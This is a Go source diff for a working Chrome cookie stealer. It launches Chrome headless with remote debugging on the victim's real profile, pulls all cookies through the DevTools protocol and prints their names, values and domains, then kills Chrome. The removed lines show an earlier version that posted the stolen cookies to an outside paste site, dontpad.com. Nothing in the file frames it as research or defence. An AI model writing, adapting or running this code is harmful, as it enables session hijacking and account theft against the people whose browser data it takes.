@@ -4,9 +4,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
-	"log"
 	"net/http"
-	"net/url"
 	"os"
 	"os/exec"
 	"os/user"
@@ -62,58 +60,68 @@ type LightCookie struct {
 	Expires float64 `json:"expirationDate"`
 }
 
-func GetDebugData(debugPort string) []DebugData {
+func main() {
+	debugPort := "9999"
 
-	// Create debugURL from user input
+	err := startProcess()
+	if err != nil {
+		os.Exit(0)
+	}
+
+	debugList, err := getDebugData(debugPort)
+	if err != nil {
+		os.Exit(1)
+	}
+
+	err = dumpCookies(debugList)
+	if err != nil {
+		os.Exit(2)
+	}
+
+	terminateProcess()
+	os.Exit(3)
+}
+
+// GetDebugData access the /json endpoint to retrieve debug data
+func getDebugData(debugPort string) ([]DebugData, error) {
+	var debugList []DebugData
 	var debugURL = "http://localhost:" + debugPort + "/json"
 
-	// Make GET request
 	resp, err := http.Get(debugURL)
 	if err != nil {
-		log.Fatalln(err)
+		return debugList, err
 	}
 
-	// Read GET response
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		log.Fatalln(err)
+		return debugList, err
 	}
-
-	// Unmarshal JSON response
-	var debugList []DebugData
 	err = json.Unmarshal(body, &debugList)
 	if err != nil {
-		log.Fatalln(err)
+		return debugList, err
 	}
 
-	return debugList
+	return debugList, nil
 }
 
 // DumpCookies interacts with the webSocketDebuggerUrl to obtain Chromium cookies
-func DumpCookies(debugList []DebugData) {
-
-	// Obtain WebSocketDebuggerURL from DebugData list
+func dumpCookies(debugList []DebugData) error {
 	var websocketURL = debugList[0].WebSocketDebuggerURL
-
-	// Connect to websocket
 	ws, err := websocket.Dial(websocketURL, "", "http://localhost/")
 	if err != nil {
-		log.Fatal(err)
+		return err
 	}
 
-	// Send message to websocket
 	var message = "{\"id\": 1, \"method\":\"Network.getAllCookies\"}"
 	websocket.Message.Send(ws, message)
 
-	// Get cookies from websocket
 	var rawResponse []byte
 	websocket.Message.Receive(ws, &rawResponse)
 
-	// Unmarshal JSON response
 	var websocketResponseRoot WebsocketResponseRoot
 	err = json.Unmarshal(rawResponse, &websocketResponseRoot)
 	if err != nil {
-		log.Fatalln(err)
+		return err
 	}
 	lightCookieList := []LightCookie{}
 
@@ -129,60 +137,38 @@ func DumpCookies(debugList []DebugData) {
 		lightCookieList = append(lightCookieList, lightCookie)
 	}
 
-	lightCookieJSON, err := json.Marshal(lightCookieList)
-	if err != nil {
-		log.Fatalln(err)
+	for _, cookie := range lightCookieList {
+		message := fmt.Sprintf(
+			"Name: %s\nValue: %s\nDomain: %s\nPath: %s\nExpire: %f\n",
+			cookie.Name,
+			cookie.Value,
+			cookie.Domain,
+			cookie.Path,
+			cookie.Expires,
+		)
+		fmt.Print(message)
 	}
-	//fmt.Printf("%s\n", lightCookieJSON)
-	//f, err := os.Create("cookies.json")
-	//if err != nil {
-	//	log.Fatalln(err)
-	//}
-	//defer f.Close()
-	//_, err2 := f.WriteString(string(lightCookieJSON))
-	//if err2 != nil {
-	//	log.Fatal(err2)
-	//}
-	SendJson(string(lightCookieJSON))
+	return nil
 }
 
-func SendJson(cookies string) {
-	fullurl := "http://dontpad.com/cstealrca"
-	resp, err := http.PostForm(fullurl, url.Values{
-		"text": {cookies}})
-	if err != nil {
-		log.Fatal(err)
-	}
-	fmt.Print(resp.Body)
-}
-
-func StartProcess() {
+// startProcess starts a new chrome browser in headless and debug mode
+func startProcess() error {
 	user, err := user.Current()
 	if err != nil {
-		log.Println(err)
+		return err
 	}
 	cmd := exec.Command("powershell.exe", "-c", `Start-Process "chrome.exe" -ArgumentList '--remote-debugging-port=9999 --headless --user-data-dir="`+user.HomeDir+`\AppData\Local\Google\Chrome\User Data"'`)
 	if err := cmd.Run(); err != nil {
-		log.Println("Error:", err)
+		return err
 	}
+	return nil
 }
 
-func TerminateProcess() {
+// terminateProcess kills the chrome process
+func terminateProcess() error {
 	cmd := exec.Command("powershell.exe", "-c", `Get-Process "chrome" | Stop-Process`)
 	if err := cmd.Run(); err != nil {
-		log.Println("Error:", err)
+		return err
 	}
-}
-
-func main() {
-
-	var debugPort string = "9999"
-
-	StartProcess()
-
-	debugList := GetDebugData(debugPort)
-	DumpCookies(debugList)
-
-	TerminateProcess()
-	os.Exit(0)
+	return nil
 }
